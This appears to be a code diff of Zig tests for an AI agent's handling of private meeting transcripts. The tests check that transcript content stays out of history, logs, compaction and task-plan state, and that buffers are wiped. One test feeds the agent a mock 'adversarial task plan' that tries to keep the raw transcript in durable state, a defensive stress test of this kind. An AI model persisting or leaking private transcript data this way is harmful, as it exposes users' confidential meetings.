+                .tool_calls = calls,
+                .usage = .{},
+                .model = try allocator.dupe(u8, "kimi-k2.6"),
+            };
+        }
+
+        fn supportsNativeTools(_: *anyopaque) bool {
+            return true;
+        }
+
+        fn supportsStreaming(_: *anyopaque) bool {
+            return true;
+        }
+
+        fn getName(_: *anyopaque) []const u8 {
+            return "minutes-exhaustion-test";
+        }
+
+        fn deinitFn(_: *anyopaque) void {}
+    };
+
+    const allocator = std.testing.allocator;
+    var provider_state = ExhaustionProvider{};
+    const provider_vtable = Provider.VTable{
+        .chatWithSystem = ExhaustionProvider.chatWithSystem,
+        .chat = ExhaustionProvider.chat,
+        .supportsNativeTools = ExhaustionProvider.supportsNativeTools,
+        .supports_sensitive_streaming_for_request = supportsSensitiveTestStreaming,
+        .getName = ExhaustionProvider.getName,
+        .deinit = ExhaustionProvider.deinitFn,
+        .supports_streaming = ExhaustionProvider.supportsStreaming,
+        .stream_chat = ExhaustionProvider.streamChat,
+    };
+    const provider = Provider{ .ptr = @ptrCast(&provider_state), .vtable = &provider_vtable };
+
+    var minutes_tool = MinutesForegroundSentinelTool{};
+    const tool_list = [_]Tool{minutes_tool.tool()};
+    const specs = try allocator.alloc(ToolSpec, tool_list.len);
+    for (tool_list, 0..) |tool, i| {
+        specs[i] = .{ .name = tool.name(), .description = tool.description(), .parameters_json = tool.parametersJson() };
+    }
+
+    var noop = observability.NoopObserver{};
+    var recorder = StreamRecorder{};
+    defer recorder.deinit();
+    var agent = Agent{
+        .allocator = allocator,
+        .provider = provider,
+        .tools = &tool_list,
+        .tool_specs = specs,
+        .mem = null,
+        .observer = noop.observer(),
+        .model_name = "kimi-k2.6",
+        .vision_fallback_model = "unapproved-vision-model",
+        .temperature = 0.7,
+        .workspace_dir = "/tmp",
+        .max_tool_iterations = 1,
+        .max_history_messages = 50,
+        .auto_save = false,
+        .history = .empty,
+        .stream_callback = StreamRecorder.onChunk,
+        .stream_ctx = @ptrCast(&recorder),
+    };
+    defer agent.deinit();
+
+    var minutes_budget = tools_mod.MinutesReadTurnBudget{};
+    installMinutesTestTurnContext(&minutes_budget);
+    defer tools_mod.clearTurnContext();
+    var outcome = try agent.turnOutcome(
+        "[IMAGE:data:image/png;base64,iVBORw0KGgo=] Summarize my last meeting.",
+    );
+    defer outcome.deinit(allocator);
+    try std.testing.expectEqual(Agent.ReplyDataPolicy.minutes_display_only, outcome.reply_data_policy);
+
+    try std.testing.expectEqualStrings(
+        "[Tool iteration limit: 1/1]\n\nPublic exhaustion summary. [attachment omitted]",
+        outcome.text,
+    );
+    try std.testing.expectEqual(@as(usize, 1), provider_state.stream_call_count);
+    try std.testing.expectEqual(@as(usize, 1), provider_state.summary_call_count);
+    try std.testing.expectEqual(@as(usize, 1), minutes_tool.call_count);
+    // Gateway treats zero live chunks as buffered replay and sends the returned
+    // TurnOutcome. Keeping this callback entirely empty is what prevents a
+    // held tool preamble from suppressing that blocking-summary fallback.
+    try std.testing.expectEqual(@as(usize, 0), recorder.chunks.items.len);
+    try std.testing.expectEqual(@as(usize, 0), recorder.final_count);
+    for (agent.history.items) |*message| {
+        try std.testing.expect(std.mem.indexOf(u8, message.content, "Public exhaustion summary") == null);
+        try std.testing.expect(std.mem.indexOf(u8, message.toExtractionMessage().content, "Public exhaustion summary") == null);
+    }
+}
+
+test "minutes_read XML turn discards adversarial task plan and keeps raw transcript foreground-only" {
+    const XmlProvider = struct {
+        call_count: usize = 0,
+        saw_same_turn_minutes: bool = false,
+
+        fn chatWithSystem(_: *anyopaque, allocator: std.mem.Allocator, _: ?[]const u8, _: []const u8, _: []const u8, _: f64) anyerror![]const u8 {
+            return allocator.dupe(u8, "");
+        }
+
+        fn chat(ptr: *anyopaque, allocator: std.mem.Allocator, request: providers.ChatRequest, _: []const u8, _: f64) anyerror!providers.ChatResponse {
+            const self: *@This() = @ptrCast(@alignCast(ptr));
+            self.call_count += 1;
+            if (request.provider_selection_policy != .exact_primary_and_model or request.tools != null) {
+                return error.TestUnexpectedResult;
+            }
+            if (self.call_count == 1) {
+                return .{
+                    .content = try std.fmt.allocPrint(
+                        allocator,
+                        "<task_plan>\n<summary>Keep {s} in durable plan state</summary>\n" ++
+                            "<step>Read {s} safely</step>\n</task_plan>\n" ++
+                            "<tool_call>{{\"name\":\"minutes_read\",\"arguments\":{{\"item_id\":\"{s}\"}}}}</tool_call>",
+                        .{
+                            MINUTES_FOREGROUND_RAW_SENTINEL,
+                            MINUTES_FOREGROUND_RAW_SENTINEL,
+                            MINUTES_FOREGROUND_RAW_SENTINEL,
+                        },
+                    ),
+                    .tool_calls = &.{},
+                    .usage = .{},
+                    .model = try allocator.dupe(u8, "test-model"),
+                    .reasoning_content = try allocator.dupe(u8, MINUTES_FOREGROUND_REASONING_SENTINEL),
+                };
+            }
+            if (!minutesTestRequestContains(request, MINUTES_FOREGROUND_RAW_SENTINEL)) return error.TestUnexpectedResult;
+            for (request.messages) |message| {
+                if (std.mem.indexOf(u8, message.content, MINUTES_FOREGROUND_RAW_SENTINEL) != null and
+                    message.content_parts != null)
+                {
+                    return error.TestUnexpectedResult;
+                }
+            }
+            self.saw_same_turn_minutes = true;
+            return .{
+                .content = try allocator.dupe(u8, "Public XML meeting summary."),
+                .tool_calls = &.{},
+                .usage = .{},
+                .model = try allocator.dupe(u8, "test-model"),
+                .reasoning_content = try allocator.dupe(u8, MINUTES_FOREGROUND_REASONING_SENTINEL),
+            };
+        }
+
+        fn supportsNativeTools(_: *anyopaque) bool {
+            // Models a reliable wrapper whose fallback supports native tools
+            // while the exact primary approved for Minutes does not.
+            return true;
+        }
+
+        fn supportsNativeToolsForRequest(_: *anyopaque, request: providers.ChatRequest) bool {
+            return request.provider_selection_policy != .exact_primary_and_model;
+        }
+
+        fn supportsStreaming(_: *anyopaque) bool {
+            return true;
+        }
+
+        fn streamChat(
+            ptr: *anyopaque,
+            allocator: std.mem.Allocator,
+            request: providers.ChatRequest,
+            model: []const u8,
+            temperature: f64,
+            callback: providers.StreamCallback,
+            callback_ctx: *anyopaque,
+        ) anyerror!providers.StreamChatResult {
+            const response = try chat(ptr, allocator, request, model, temperature);
+            if (response.content) |content| {
+                if (content.len > 0) callback(callback_ctx, providers.StreamChunk.textDelta(content));
+            }
+            callback(callback_ctx, providers.StreamChunk.finalChunk());
+            return .{
+                .content = response.content,
+                .tool_calls = response.tool_calls,
+                .usage = response.usage,
+                .model = response.model,
+                .reasoning_content = response.reasoning_content,
+                .stream_tool_call_chunks = response.stream_tool_call_chunks,
+            };
+        }
+
+        fn getName(_: *anyopaque) []const u8 {
+            return "minutes-xml-foreground-test";
+        }
+
+        fn deinitFn(_: *anyopaque) void {}
+    };
+
+    const allocator = std.testing.allocator;
+    var provider_state = XmlProvider{};
+    const provider_vtable = Provider.VTable{
+        .chatWithSystem = XmlProvider.chatWithSystem,
+        .chat = XmlProvider.chat,
+        .supportsNativeTools = XmlProvider.supportsNativeTools,
+        .supports_native_tools_for_request = XmlProvider.supportsNativeToolsForRequest,
+        .supports_sensitive_streaming_for_request = supportsSensitiveTestStreaming,
+        .supports_streaming = XmlProvider.supportsStreaming,
+        .stream_chat = XmlProvider.streamChat,
+        .getName = XmlProvider.getName,
+        .deinit = XmlProvider.deinitFn,
+    };
+    const provider = Provider{ .ptr = @ptrCast(&provider_state), .vtable = &provider_vtable };
+
+    var minutes_tool = MinutesForegroundSentinelTool{};
+    const tool_list = [_]Tool{minutes_tool.tool()};
+    const specs = try allocator.alloc(ToolSpec, tool_list.len);
+    for (tool_list, 0..) |tool, i| {
+        specs[i] = .{ .name = tool.name(), .description = tool.description(), .parameters_json = tool.parametersJson() };
+    }
+
+    var observer = MinutesPrivacyObserver{};
+    var agent = Agent{
+        .allocator = allocator,
+        .provider = provider,
+        .tools = &tool_list,
+        .tool_specs = specs,
+        .mem = null,
+        .observer = observer.observer(),
+        .model_name = "test-model",
+        .temperature = 0.7,
+        .workspace_dir = "/tmp",
+        .max_tool_iterations = 1,
+        .max_history_messages = 50,
+        .auto_save = false,
+        .history = .empty,
+        .narration_ring_buffer = narration.NarrationRingBuffer.init(allocator),
+    };
+    defer agent.deinit();
+
+    var minutes_budget = tools_mod.MinutesReadTurnBudget{};
+    installMinutesTestTurnContext(&minutes_budget);
+    defer tools_mod.clearTurnContext();
+    const response = try agent.turn("Summarize my last meeting through XML fallback.");
+    defer allocator.free(response);
+
+    try std.testing.expectEqualStrings("[Tool iteration limit: 1/1]\n\nPublic XML meeting summary.", response);
+    try std.testing.expectEqual(@as(usize, 2), provider_state.call_count);
+    try std.testing.expect(provider_state.saw_same_turn_minutes);
+    try std.testing.expectEqual(@as(usize, 1), minutes_tool.call_count);
+    try std.testing.expect(observer.saw_minutes_start);
+    try std.testing.expect(observer.saw_minutes_result);
+    try std.testing.expect(!observer.saw_input_preview);
+    try std.testing.expect(!observer.saw_output_preview);
+    try std.testing.expect(!observer.saw_sensitive_narration);
+    try std.testing.expect(!observer.saw_plan_created);
+    try std.testing.expect(agent.active_task_plan == null);
+    try assertMinutesDirectForegroundArtifactsAreAbsent(&agent, allocator, "Public XML meeting summary.");
+}
+
+test "minutes_read foreground lane is destroyed on provider error" {
+    const FailingProvider = struct {
+        call_count: usize = 0,
+
+        fn chatWithSystem(_: *anyopaque, allocator: std.mem.Allocator, _: ?[]const u8, _: []const u8, _: []const u8, _: f64) anyerror![]const u8 {
+            return allocator.dupe(u8, "");
+        }
+
+        fn chat(ptr: *anyopaque, allocator: std.mem.Allocator, request: providers.ChatRequest, _: []const u8, _: f64) anyerror!providers.ChatResponse {
+            const self: *@This() = @ptrCast(@alignCast(ptr));
+            self.call_count += 1;
+            if (self.call_count == 1) {
+                const calls = try allocator.alloc(providers.ToolCall, 1);
+                calls[0] = .{
+                    .id = try allocator.dupe(u8, "call-minutes-error-cleanup"),
+                    .name = try allocator.dupe(u8, MinutesForegroundSentinelTool.tool_name),
+                    .arguments = try allocator.dupe(u8, "{}"),
+                };
+                return .{
+                    .content = try allocator.dupe(u8, "Reading before provider failure."),
+                    .tool_calls = calls,
+                    .usage = .{},
+                    .model = try allocator.dupe(u8, "test-model"),
+                    .reasoning_content = try allocator.dupe(u8, MINUTES_FOREGROUND_REASONING_SENTINEL),
+                };
+            }
+            if (!minutesTestRequestContains(request, MINUTES_FOREGROUND_RAW_SENTINEL)) return error.TestUnexpectedResult;
+            return error.DeliberateMinutesProviderFailure;
+        }
+
+        fn supportsNativeTools(_: *anyopaque) bool {
+            return true;
+        }
+
+        fn supportsStreaming(_: *anyopaque) bool {
+            return true;
+        }
+
+        fn streamChat(
+            ptr: *anyopaque,
+            allocator: std.mem.Allocator,
+            request: providers.ChatRequest,
+            model: []const u8,
+            temperature: f64,
+            callback: providers.StreamCallback,
+            callback_ctx: *anyopaque,
+        ) anyerror!providers.StreamChatResult {
+            const response = try chat(ptr, allocator, request, model, temperature);
+            if (response.content) |content| {
+                if (content.len > 0) callback(callback_ctx, providers.StreamChunk.textDelta(content));
+            }
+            callback(callback_ctx, providers.StreamChunk.finalChunk());
+            return .{
+                .content = response.content,
+                .tool_calls = response.tool_calls,
+                .usage = response.usage,
+                .model = response.model,
+                .reasoning_content = response.reasoning_content,
+                .stream_tool_call_chunks = response.stream_tool_call_chunks,
+            };
+        }
+
+        fn getName(_: *anyopaque) []const u8 {
+            return "openai-minutes-error-test";
+        }
+
+        fn deinitFn(_: *anyopaque) void {}
+    };
+
+    const allocator = std.testing.allocator;
+    var provider_state = FailingProvider{};
+    const provider_vtable = Provider.VTable{
+        .chatWithSystem = FailingProvider.chatWithSystem,
+        .chat = FailingProvider.chat,
+        .supportsNativeTools = FailingProvider.supportsNativeTools,
+        .supports_sensitive_streaming_for_request = supportsSensitiveTestStreaming,
+        .supports_streaming = FailingProvider.supportsStreaming,
+        .stream_chat = FailingProvider.streamChat,
+        .getName = FailingProvider.getName,
+        .deinit = FailingProvider.deinitFn,
+    };
+    const provider = Provider{ .ptr = @ptrCast(&provider_state), .vtable = &provider_vtable };
+
+    var minutes_tool = MinutesForegroundSentinelTool{};
+    const tool_list = [_]Tool{minutes_tool.tool()};
+    const specs = try allocator.alloc(ToolSpec, tool_list.len);
+    for (tool_list, 0..) |tool, i| {
+        specs[i] = .{ .name = tool.name(), .description = tool.description(), .parameters_json = tool.parametersJson() };
+    }
+
+    var observer = MinutesPrivacyObserver{};
+    var agent = Agent{
+        .allocator = allocator,
+        .provider = provider,
+        .tools = &tool_list,
+        .tool_specs = specs,
+        .mem = null,
+        .observer = observer.observer(),
+        .model_name = "test-model",
+        .temperature = 0.7,
+        .workspace_dir = "/tmp",
+        .max_tool_iterations = 4,
+        .max_history_messages = 50,
+        .auto_save = false,
+        .history = .empty,
+        .provider_reliability_active = true,
+        .narration_ring_buffer = narration.NarrationRingBuffer.init(allocator),
+    };
+    defer agent.deinit();
+
+    var minutes_budget = tools_mod.MinutesReadTurnBudget{};
+    installMinutesTestTurnContext(&minutes_budget);
+    defer tools_mod.clearTurnContext();
+    try std.testing.expectError(error.DeliberateMinutesProviderFailure, agent.turn("Read a meeting, then fail safely."));
+    try std.testing.expectEqual(@as(usize, 2), provider_state.call_count);
+    try std.testing.expectEqual(@as(usize, 1), minutes_tool.call_count);
+    try std.testing.expect(observer.saw_minutes_start);
+    try std.testing.expect(observer.saw_minutes_result);
+    try std.testing.expect(!observer.saw_input_preview);
+    try std.testing.expect(!observer.saw_output_preview);
+    try std.testing.expect(!observer.saw_sensitive_narration);
+    for (agent.history.items) |message| {
+        try std.testing.expect(std.mem.indexOf(u8, message.content, MINUTES_FOREGROUND_RAW_SENTINEL) == null);
+        try std.testing.expect(std.mem.indexOf(u8, message.content, MINUTES_FOREGROUND_REASONING_SENTINEL) == null);
+        try std.testing.expectEqual(@as(usize, 0), message.tool_calls.len);
+    }
+}
+
+test "minutes_read foreground output cap cannot exceed dispatcher context cap" {
+    try std.testing.expect(tools_mod.minutes_read.MAX_DISPATCH_OUTPUT_BYTES <= dispatcher.MAX_TOOL_RESULT_CONTEXT_CHARS);
+}
+
+test "minutes_read failure output is redacted before durable task-plan state" {
+    const minutes_result = ToolExecutionResult{
+        .name = MinutesForegroundSentinelTool.tool_name,
+        .output = MINUTES_FOREGROUND_RAW_SENTINEL,
+        .success = false,
+        .tool_call_id = null,
+    };
+    try std.testing.expectEqualStrings("minutes_read failed", Agent.taskPlanFailureSummary(minutes_result, false));
+
+    const downstream_result = ToolExecutionResult{
+        .name = CountingRuntimeInfoTool.tool_name,
+        .output = MINUTES_FOREGROUND_RAW_SENTINEL,
+        .success = false,
+        .tool_call_id = null,
+    };
+    try std.testing.expectEqualStrings("tool failed after minutes_read", Agent.taskPlanFailureSummary(downstream_result, true));
+}
+
+test "minutes_read burst never enters repeated-call hash state" {
+    const sensitive_calls = [_]ParsedToolCall{.{
+        .name = MinutesForegroundSentinelTool.tool_name,
+        .arguments_json = "{\"meeting_id\":\"" ++ MINUTES_FOREGROUND_RAW_SENTINEL ++ "\"}",
+        .tool_call_id = "minutes-sensitive-loop-call",
+    }};
+    const initial_hashes = [_]u64{ 0x1111, 0x2222, 0x3333 };
+    var recent_call_hashes = initial_hashes;
+    var recent_call_idx: usize = 7;
+
+    try std.testing.expectEqual(
+        @as(?u64, null),
+        Agent.recordLoopCallSetHash(
+            &sensitive_calls,
+            true,
+            &recent_call_hashes,
+            &recent_call_idx,
+        ),
+    );
+    try std.testing.expectEqualSlices(u64, &initial_hashes, &recent_call_hashes);
+    try std.testing.expectEqual(@as(usize, 7), recent_call_idx);
+
+    const ordinary_calls = [_]ParsedToolCall{.{
+        .name = CountingRuntimeInfoTool.tool_name,
+        .arguments_json = "{}",
+        .tool_call_id = "ordinary-loop-call",
+    }};
+    try std.testing.expect(Agent.recordLoopCallSetHash(
+        &ordinary_calls,
+        false,
+        &recent_call_hashes,
+        &recent_call_idx,
+    ) != null);
+    try std.testing.expectEqual(@as(usize, 8), recent_call_idx);
+    try std.testing.expect(recent_call_hashes[7 % Agent.LOOP_DETECTION_WINDOW] != initial_hashes[7 % Agent.LOOP_DETECTION_WINDOW]);
+}
+
+test "minutes_read strict streaming hold fails closed when buffering is out of memory" {
+    const StreamRecorder = struct {
+        chunks: std.ArrayListUnmanaged(u8) = .empty,
+        final_count: usize = 0,
+
+        fn onChunk(ctx: *anyopaque, chunk: providers.StreamChunk) void {
+            const self: *@This() = @ptrCast(@alignCast(ctx));
+            if (chunk.is_final) {
+                self.final_count += 1;
+                return;
+            }
+            self.chunks.appendSlice(std.testing.allocator, chunk.delta) catch {};
+        }
+
+        fn deinit(self: *@This()) void {
+            self.chunks.deinit(std.testing.allocator);
+        }
+    };
+
+    var noop = observability.NoopObserver{};
+    var agent = Agent{
+        .allocator = std.testing.failing_allocator,
+        .provider = undefined,
+        .tools = &.{},
+        .tool_specs = &.{},
+        .mem = null,
+        .observer = noop.observer(),
+        .model_name = "test-model",
+        .temperature = 0.7,
+        .workspace_dir = "/tmp",
+        .max_tool_iterations = 1,
+        .max_history_messages = 1,
+        .auto_save = false,
+        .history = .empty,
+    };
+    var recorder = StreamRecorder{};
+    defer recorder.deinit();
+    var timing = Agent.StreamTimingContext{
+        .agent = &agent,
+        .callback = StreamRecorder.onChunk,
+        .callback_ctx = @ptrCast(&recorder),
+        .scratch_allocator = agent.allocator,
+        .iteration = 1,
+        .provider_start_ms = std.time.milliTimestamp(),
+        .emission_mode = .hold_for_validation,
+        .strict_hold = true,
+    };
+    defer timing.deinit();
+
+    // The failing allocator makes the first buffer append fail. Strict Minutes
+    // mode must drop the unvalidated delta and pending final marker rather than
+    // falling back to the ordinary pass-through stream behavior.
+    Agent.streamCallbackWithTiming(@ptrCast(&timing), providers.StreamChunk.textDelta(MINUTES_FOREGROUND_RAW_SENTINEL));
+    Agent.streamCallbackWithTiming(@ptrCast(&timing), providers.StreamChunk.finalChunk());
+    try std.testing.expectEqual(@as(usize, 0), recorder.chunks.items.len);
+    try std.testing.expectEqual(@as(usize, 0), recorder.final_count);
+
+    timing.flushValidatedReply("Validated public meeting answer.");
+    try std.testing.expectEqualStrings("Validated public meeting answer.", recorder.chunks.items);
+    try std.testing.expectEqual(@as(usize, 1), recorder.final_count);
+}
+
+test "minutes_read strict streaming hold wipes retained backing buffers" {
+    const buffered_secret = "minutes-stream-buffer-secret-7d94";
+    const tail_secret = "minutes-stream-tail-secret-2a31";
+    var backing: [4096]u8 = undefined;
+    @memset(&backing, 0xaa);
+    var fixed = std.heap.FixedBufferAllocator.init(&backing);
+
+    var agent: Agent = undefined;
+    agent.allocator = fixed.allocator();
+    var timing = Agent.StreamTimingContext{
+        .agent = &agent,
+        .callback = undefined,
+        .callback_ctx = undefined,
+        .scratch_allocator = agent.allocator,
+        .iteration = 1,
+        .provider_start_ms = 0,
+        .strict_hold = true,
+    };
+    try timing.buffered_text.appendSlice(agent.allocator, buffered_secret);
+    try timing.pending_tail.appendSlice(agent.allocator, tail_secret);
+    // Model the normal validated/flush path: logical lengths can be zero while
+    // the retained allocations still contain the earlier provider bytes.
+    timing.buffered_text.clearRetainingCapacity();
+    timing.pending_tail.clearRetainingCapacity();
+
+    timing.deinit();
+
+    try std.testing.expect(std.mem.indexOf(u8, &backing, buffered_secret) == null);
+    try std.testing.expect(std.mem.indexOf(u8, &backing, tail_secret) == null);
+}
+
+test "minutes_read pending task plan wipes every owned PII field" {
+    const summary_secret = "minutes-plan-summary-secret-58f0";
+    const step_secret = "minutes-plan-step-secret-c113";
+    const session_secret = "minutes-plan-session-secret-9b12";
+    const run_secret = "minutes-plan-run-secret-41a0";
+    const supersedes_secret = "minutes-plan-supersedes-secret-330e";
+    const actual_tool_secret = "minutes-plan-actual-tool-secret-8e91";
+    const result_secret = "minutes-plan-result-secret-faa2";
+    const error_secret = "minutes-plan-error-secret-1c49";
+    var backing: [8192]u8 = undefined;
+    @memset(&backing, 0xaa);
+    var fixed = std.heap.FixedBufferAllocator.init(&backing);
+
+    var agent: Agent = undefined;
+    agent.allocator = fixed.allocator();
+    const plan_xml =
+        "<summary>" ++ summary_secret ++ "</summary>" ++
+        "<step id=\"meeting-private-id\" tool=\"minutes-private-tool\">" ++ step_secret ++ "</step>";
+    var plan = (try task_planner.parseTaskPlan(agent.allocator, plan_xml)).?;
+    plan.session_key = try agent.allocator.dupe(u8, session_secret);
+    plan.run_id = try agent.allocator.dupe(u8, run_secret);
+    plan.supersedes_plan_id = try agent.allocator.dupe(u8, supersedes_secret);
+    const actual_tool = try agent.allocator.dupe(u8, actual_tool_secret);
+    plan.steps[0].actual_tool = actual_tool;
+    plan.steps[0].tool_used = actual_tool;
+    plan.steps[0].result_summary = try agent.allocator.dupe(u8, result_secret);
+    plan.steps[0].error_summary = try agent.allocator.dupe(u8, error_secret);
+    const secrets = [_][]const u8{
+        summary_secret,
+        step_secret,
+        session_secret,
+        run_secret,
+        supersedes_secret,
+        actual_tool_secret,
+        result_secret,
+        error_secret,
+        "meeting-private-id",
+        "minutes-private-tool",
+    };
+    for (secrets) |secret| {
+        try std.testing.expect(std.mem.indexOf(u8, &backing, secret) != null);
+    }
+
+    agent.deinitTaskPlanWithPolicy(&plan, true);
+
+    for (secrets) |secret| {
+        try std.testing.expect(std.mem.indexOf(u8, &backing, secret) == null);
+    }
+}
+
+test "minutes_read native call cloning cleans partial allocations on OOM" {
+    const calls = [_]ParsedToolCall{.{
+        .name = tools_mod.minutes_read.MinutesReadTool.tool_name,
+        .arguments_json = "{\"meeting_id\":\"private-meeting-oom\"}",
+        .tool_call_id = "private-call-id-oom",
+    }};
+
+    // Array + id + name + arguments are four allocation sites. Exercise each
+    // failure point and one success point under the leak-checking test GPA.
+    var fail_index: usize = 0;
+    while (fail_index <= 4) : (fail_index += 1) {
+        var failing = std.testing.FailingAllocator.init(
+            std.testing.allocator,
+            .{ .fail_index = fail_index },
+        );
+        var agent: Agent = undefined;
+        agent.allocator = failing.allocator();
+        const cloned = agent.cloneParsedCallsAsProviderToolCalls(&calls) catch |err| {
+            try std.testing.expectEqual(error.OutOfMemory, err);
+            continue;
+        };
+        var response = ChatResponse{ .tool_calls = cloned };
+        agent.freeResponseFieldsWithPolicy(&response, true);
+    }
+}
+
+test "minutes_read foreground lane is excluded from compaction input" {
+    const allocator = std.testing.allocator;
+    var agent = try makeTestAgent(allocator);
+    defer agent.deinit();
+
+    try agent.history.append(allocator, .{
+        .role = .user,
+        .content = try allocator.dupe(u8, "durable user message"),
+    });
+    var foreground: std.ArrayListUnmanaged(Agent.OwnedMessage) = .empty;
+    defer agent.deinitOwnedMessageList(&foreground);
+    try foreground.append(allocator, .{
+        .role = .tool,
+        .content = try allocator.dupe(u8, MINUTES_FOREGROUND_RAW_SENTINEL),
+        .name = try allocator.dupe(u8, MinutesForegroundSentinelTool.tool_name),
+        .tool_call_id = try allocator.dupe(u8, "call-minutes-compaction-isolation"),
+    });
+
+    const provider_messages = try agent.buildMessageSliceWithForeground(foreground.items);
+    defer allocator.free(provider_messages);
+    var provider_saw_foreground = false;
+    for (provider_messages) |message| {
+        if (std.mem.indexOf(u8, message.content, MINUTES_FOREGROUND_RAW_SENTINEL) != null) {
+            provider_saw_foreground = true;
+        }
+    }
+    try std.testing.expect(provider_saw_foreground);
+
+    // ContextEngine.compact can reach only Agent.history. The foreground list
+    // is deliberately turn-local and is supplied solely to provider builders.
+    const durable_tokens_before = agent.tokenEstimate();
+    _ = agent.context_engine_state.compact(&agent);
+    try std.testing.expectEqual(durable_tokens_before, agent.tokenEstimate());
+
+    const compaction_source = try agent.buildMessageSlice();
+    defer allocator.free(compaction_source);
+    for (compaction_source) |message| {
+        try std.testing.expect(std.mem.indexOf(u8, message.content, MINUTES_FOREGROUND_RAW_SENTINEL) == null);
+    }
+    try std.testing.expectEqual(@as(usize, 1), foreground.items.len);
+    try std.testing.expectEqualStrings(MINUTES_FOREGROUND_RAW_SENTINEL, foreground.items[0].content);
+}
+
 test "V1.14.4 booth-readiness: approval_continues_turn defaults to true (regression lock)" {
     // Lock the production default at root.zig:507. The "approval drops
     // after click" bug (2026-04-18) was fixed by adding the
@@ -14800,7 +17770,7 @@ test "approval-required tool stops serial dispatch before later safe tools run" 
     var results_buf: std.ArrayListUnmanaged(ToolExecutionResult) = .empty;
     defer results_buf.deinit(allocator);
     try results_buf.ensureTotalCapacity(allocator, calls.len);
-    try agent.executeToolCallsSerial(arena.allocator(), 0, calls[0..], &results_buf);
+    try agent.executeToolCallsSerial(arena.allocator(), 0, calls[0..], &results_buf, false);
 
     try std.testing.expectEqual(@as(usize, 1), results_buf.items.len);
     try std.testing.expect(agent.pending_tool_approval != null);
@@ -14828,7 +17798,7 @@ test "approval-required checkpoint emits no failed tool_result observer event" {
     var results_buf: std.ArrayListUnmanaged(ToolExecutionResult) = .empty;
     defer results_buf.deinit(allocator);
     try results_buf.ensureTotalCapacity(allocator, calls.len);
-    try agent.executeToolCallsSerial(arena.allocator(), 0, calls[0..], &results_buf);
+    try agent.executeToolCallsSerial(arena.allocator(), 0, calls[0..], &results_buf, false);
 
     try std.testing.expectEqual(@as(usize, 1), results_buf.items.len);
     try std.testing.expect(agent.pending_tool_approval != null);
@@ -15433,7 +18403,7 @@ test "tool dispatch emits tool_start and tool_result with matching run_id and to
     var results_buf: std.ArrayListUnmanaged(ToolExecutionResult) = .empty;
     defer results_buf.deinit(allocator);
     try results_buf.ensureTotalCapacity(allocator, calls.len);
-    try agent.executeToolCallsSerial(arena.allocator(), 0, calls[0..], &results_buf);
+    try agent.executeToolCallsSerial(arena.allocator(), 0, calls[0..], &results_buf, false);
 
     try std.testing.expectEqual(@as(usize, 2), capture.events.items.len);
     const start_evt = capture.events.items[0];
